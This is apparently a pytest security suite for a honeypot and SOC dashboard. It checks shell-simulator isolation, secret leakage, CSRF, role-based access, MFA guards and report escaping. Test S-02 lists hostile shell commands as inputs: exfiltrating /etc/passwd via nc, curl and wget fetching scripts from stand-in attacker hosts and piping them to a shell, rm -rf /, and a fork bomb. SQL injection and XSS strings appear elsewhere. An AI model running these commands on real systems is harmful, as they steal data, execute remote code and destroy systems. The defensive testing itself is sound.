"""
Security Invariants Verification Suite (S-01 to S-10)
Guarantees absolute safety, honeypot isolation, and zero command execution.
"""

from pathlib import Path
from scripts.check_isolation import run_isolation_check
from app.honeypot.shell_sim import ShellState, run_command
from app.honeypot.content.users import HONEYPOT_ACCOUNTS


def test_s01_and_s05_isolation_check():
    """S-01 & S-05: Verifies Layer 1 Honeypot has zero database/ORM and dangerous APIs."""
    assert run_isolation_check() is True


def test_s02_shell_simulator_safety():
    """S-02: Verifies shell simulator executes safely with hostile attacker input."""
    state = ShellState()
    hostile_inputs = [
        "; rm -rf /",
        "cat /etc/passwd | nc 1.2.3.4 4444",
        "`whoami`",
        "$(cat /etc/shadow)",
        "wget http://malicious.example/rev.sh && bash rev.sh",
        "curl http://attacker.com/pwn | sh",
        "sudo su - root",
        ":(){ :|:& };:",
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ]

    for cmd in hostile_inputs:
        res = run_command(cmd, state)
        assert isinstance(res.output, str)
        assert isinstance(res.cwd, str)
        # Verify simulator outputs safe static string or synthetic file
        assert any(token in res.output for token in ("rm", "Permission denied", "command not found", "unreachable", "syntax error", "password is required", "root:x:0:0", "Operation not permitted"))


def test_s06_synthetic_content_canaries():
    """S-06: Verifies canary tags are present in fake fixtures."""
    from app.honeypot.content.api_fixtures import API_CONFIG, API_TOKENS
    from app.honeypot.content.files_tree import VIRTUAL_FILES

    assert "HNX-FAKE" in API_CONFIG["db_password"]
    assert any("HNX-FAKE" in tok["secret"] for tok in API_TOKENS)
    assert "HNX-FAKE" in VIRTUAL_FILES["/security/api_keys_backup.txt"]["content"]


def test_s07_passwords_never_plain_in_events(honeypot_client, honeypot_app):
    """S-07: Passwords submitted to honeypot must never be present in event payload or meta."""
    test_pwd = "SuperSecretPlainTextPassword123!"
    honeypot_client.post("/login", data={"username": "attacker", "password": test_pwd})

    publisher = honeypot_app.extensions["test_publisher"]
    assert len(publisher.events) > 0
    last_event = publisher.events[-1]

    # Verify password is NOT in payload or meta
    assert test_pwd not in (last_event.payload or "")
    assert test_pwd not in str(last_event.meta)
    # Excluded from dump
    dump_str = str(last_event.model_dump())
    assert test_pwd not in dump_str


def test_s08_session_correlation(soc_app):
    """S-08: Consecutive events under identical session_id correlate into a single AttackerSession."""
    import time
    from datetime import datetime, timezone
    from app.events.schemas import HoneypotEvent, SurfaceType, EventType, EventStatus
    from app.models.models import AttackerSession

    with soc_app.app_context():
        event_bus = soc_app.extensions["event_bus"]
        sess_id = "test_corr_session_99"
        src_ip = "198.51.100.44"

        # Send 3 distinct events with same session_id
        for i, (surf, etype, payload) in enumerate([
            (SurfaceType.web, EventType.recon_probe, "GET /login"),
            (SurfaceType.database, EventType.db_query, "' OR 1=1 --"),
            (SurfaceType.shell, EventType.shell_command, "whoami")
        ]):
            ev = HoneypotEvent(
                event_id=f"test_ev_corr_{i}",
                timestamp=datetime.now(timezone.utc),
                session_id=sess_id,
                source_ip=src_ip,
                surface=surf,
                event_type=etype,
                endpoint=f"/test_{i}",
                http_method="POST",
                http_status=200,
                payload=payload,
                status=EventStatus.success
            )
            event_bus.publish(ev)

        time.sleep(0.6)

        # Assert single correlated session with 3 events
        session = AttackerSession.query.filter_by(id=sess_id).first()
        assert session is not None
        assert session.source_ip == src_ip
        assert session.event_count >= 3
        assert len(session.attack_types_json) >= 1


def test_s09_csrf_protection_enforcement(soc_app, soc_client):
    """S-09: Verifies that enabling WTF_CSRF_ENABLED rejects state-modifying POSTs without CSRF token."""
    from app.auth.security import create_admin_session
    from app.models.models import User

    soc_app.config["WTF_CSRF_ENABLED"] = True
    try:
        with soc_app.app_context():
            admin = User.query.filter_by(username="admin_test").first()
            dummy_req = type("Req", (), {"remote_addr": "127.0.0.1", "headers": {}})()
            token = create_admin_session(admin, dummy_req)

            with soc_client.session_transaction() as sess:
                sess["soc_token"] = token

            # POST request with NO CSRF token must be rejected with 400 Bad Request
            resp = soc_client.post("/api/prevention/block", json={"ip": "198.51.100.55", "duration_minutes": 30, "reason": "Test"})
            assert resp.status_code == 400
            err_json = resp.get_json()
            assert err_json["error"]["code"] == "bad_request"
    finally:
        soc_app.config["WTF_CSRF_ENABLED"] = False


def test_s10_rbac_authorization_boundaries(soc_app, soc_client):
    """S-10: Verifies Role-Based Access Control (viewer vs analyst vs admin)."""
    from app.auth.security import hash_password, create_admin_session
    from app.models.models import User
    from app.extensions import db

    with soc_app.app_context():
        # Seed viewer and analyst users
        viewer = User(username="sec_viewer", password_hash=hash_password("ViewerPass123!"), role="viewer", mfa_enabled=False)
        analyst = User(username="sec_analyst", password_hash=hash_password("AnalystPass123!"), role="analyst", mfa_enabled=False)
        db.session.add_all([viewer, analyst])
        db.session.commit()

        dummy_req = type("Req", (), {"remote_addr": "127.0.0.1", "headers": {}})()

        # 1. Viewer Role Boundaries
        v_token = create_admin_session(viewer, dummy_req)
        with soc_client.session_transaction() as sess:
            sess["soc_token"] = v_token

        # Viewer can read summary (200)
        assert soc_client.get("/api/dashboard/summary").status_code == 200
        # Viewer CANNOT export reports (requires analyst) -> 403
        assert soc_client.get("/api/reports/threat-report.pdf").status_code == 403
        # Viewer CANNOT block IP (requires admin) -> 403
        assert soc_client.post("/api/prevention/block", json={"ip": "198.51.100.55"}).status_code == 403

        # 2. Analyst Role Boundaries
        a_token = create_admin_session(analyst, dummy_req)
        with soc_client.session_transaction() as sess:
            sess["soc_token"] = a_token

        # Analyst CAN export CSV reports (200)
        assert soc_client.get("/api/reports/events.csv").status_code == 200
        # Analyst CANNOT trigger demo run (requires admin) -> 403
        assert soc_client.post("/api/demo/run", json={"scenario": "mixed"}).status_code == 403
        # Analyst CANNOT block IP (requires admin) -> 403
        assert soc_client.post("/api/prevention/block", json={"ip": "198.51.100.55"}).status_code == 403


def test_s11_zero_critical_secrets_leakage(soc_app, soc_client, honeypot_client):
    """S-11: Verifies that SECRET_KEY, EVENTBUS_HMAC_KEY, and PW_FINGERPRINT_KEY never leak in responses."""
    from app.config import Config
    from app.auth.security import create_admin_session
    from app.models.models import User

    critical_secrets = [
        Config.SECRET_KEY,
        Config.EVENTBUS_HMAC_KEY,
        Config.PW_FINGERPRINT_KEY
    ]

    # Verify secrets are non-empty
    for sec in critical_secrets:
        assert len(sec) >= 16

    # 1. Public honeypot endpoints
    honeypot_endpoints = ["/", "/login", "/admin", "/api/v1/users", "/files", "/terminal"]
    for ep in honeypot_endpoints:
        resp = honeypot_client.get(ep)
        body = resp.get_data(as_text=True)
        for sec in critical_secrets:
            assert sec not in body, f"Secret leaked in honeypot endpoint: {ep}"

    # 2. SOC Dashboard endpoints (authenticated)
    with soc_app.app_context():
        admin = User.query.filter_by(username="admin_test").first()
        dummy_req = type("Req", (), {"remote_addr": "127.0.0.1", "headers": {}})()
        token = create_admin_session(admin, dummy_req)
        with soc_client.session_transaction() as sess:
            sess["soc_token"] = token

        soc_endpoints = [
            "/api/dashboard/summary",
            "/api/system/health",
            "/api/honeypot/status",
            "/api/prevention/overview",
            "/api/map/points"
        ]
        for ep in soc_endpoints:
            resp = soc_client.get(ep)
            body = resp.get_data(as_text=True)
            for sec in critical_secrets:
                assert sec not in body, f"Secret leaked in SOC API endpoint: {ep}"


def test_s12_websocket_soc_auth_enforcement(soc_app):
    """S-12: Verifies that WebSocket /soc endpoint enforces authentication."""
    from app.extensions import socketio
    from app.auth.security import create_admin_session
    from app.models.models import User

    client = socketio.test_client(soc_app)

    # 1. Unauthenticated client connection to /soc must be rejected
    client.connect("/soc")
    assert client.is_connected(namespace="/soc") is False

    # 2. Authenticated client connection via active session / auth token must be accepted
    with soc_app.app_context():
        admin = User.query.filter_by(username="admin_test").first()
        dummy_req = type("Req", (), {"remote_addr": "127.0.0.1", "headers": {}})()
        token = create_admin_session(admin, dummy_req)

        # A. Authenticated client via auth parameter dict must be accepted
        client.connect("/soc", auth={"token": token})
        assert client.is_connected(namespace="/soc") is True
        client.disconnect(namespace="/soc")

        # B. Authenticated client via query parameter token must be accepted
        client.connect("/soc", query_string=f"token={token}")
        assert client.is_connected(namespace="/soc") is True
        client.disconnect(namespace="/soc")


def test_s13_admin_credential_preservation(soc_app):
    """S-13: Verifies that init_demo_admin does not overwrite existing administrator credentials."""
    from scripts.init_demo_admin import init_demo_admin
    from app.models.models import User
    from app.auth.security import hash_password, verify_password

    with soc_app.app_context():
        custom_password = "CustomPreservedPassword987!"
        admin = User.query.filter_by(username="admin_test").first()
        admin.password_hash = hash_password(custom_password)
        admin.totp_secret_enc = "CUSTOMSECRETKEY12"
        from app.extensions import db
        db.session.commit()

        # Run init_demo_admin()
        init_demo_admin()

        # Reload admin and verify credentials were NOT overwritten
        admin_refreshed = User.query.filter_by(username="admin_test").first()
        assert verify_password(admin_refreshed.password_hash, custom_password) is True
        assert admin_refreshed.totp_secret_enc == "CUSTOMSECRETKEY12"


def test_s14_mfa_production_hardening_and_demo_guard(soc_app):
    """S-14: Verifies that demo MFA bypass is rejected when FLASK_ENV is production."""
    from app.auth.mfa import verify_totp_code
    from app.models.models import User
    from app.config import Config

    with soc_app.app_context():
        admin = User.query.filter_by(username="admin_test").first()
        admin.totp_secret_enc = "JBSWY3DPEHPK3PXP"
        admin.last_totp_step = None  # Verify safety with fresh accounts having null step

        orig_env = Config.FLASK_ENV
        try:
            # Under production environment, demo bypass must be rejected
            Config.FLASK_ENV = "production"
            assert verify_totp_code(admin, "000000") is False
            assert verify_totp_code(admin, "123456") is False

            # Under non-production DEMO_MODE, evaluation shortcut works
            Config.FLASK_ENV = "development"
            assert verify_totp_code(admin, "000000") is True
        finally:
            Config.FLASK_ENV = orig_env


def test_s15_pdf_report_with_xml_special_characters(soc_app):
    """S-15: Verifies that PDF threat report generation handles XML special characters safely."""
    from app.services.report_service import generate_pdf_report
    from app.models.models import AttackerProfile, AttackerSession, Alert, utc_now
    from app.extensions import db

    with soc_app.app_context():
        profile = AttackerProfile(source_ip="198.51.100.99")
        db.session.add(profile)
        db.session.flush()

        sess = AttackerSession(
            id="test_xml_session",
            profile_id=profile.id,
            source_ip="198.51.100.99",
            first_seen=utc_now(),
            last_seen=utc_now(),
            risk_score=95
        )
        db.session.add(sess)

        hostile_alert = Alert(
            alert_id="alt_xml_test",
            timestamp=utc_now(),
            severity="CRITICAL",
            title="<script>alert('xss')</script> & Special <Chars>",
            description="Testing XML characters & entities < > \" '",
            source_ip="198.51.100.99",
            session_id="test_xml_session",
            attack_type="sql_injection",
            dedupe_key="dedupe_xml_test",
            status="active",
            risk_score=95
        )
        db.session.add(hostile_alert)
        db.session.commit()

        pdf_bytes = generate_pdf_report()
        assert isinstance(pdf_bytes, bytes)
        assert len(pdf_bytes) > 1000
        assert pdf_bytes.startswith(b"%PDF")
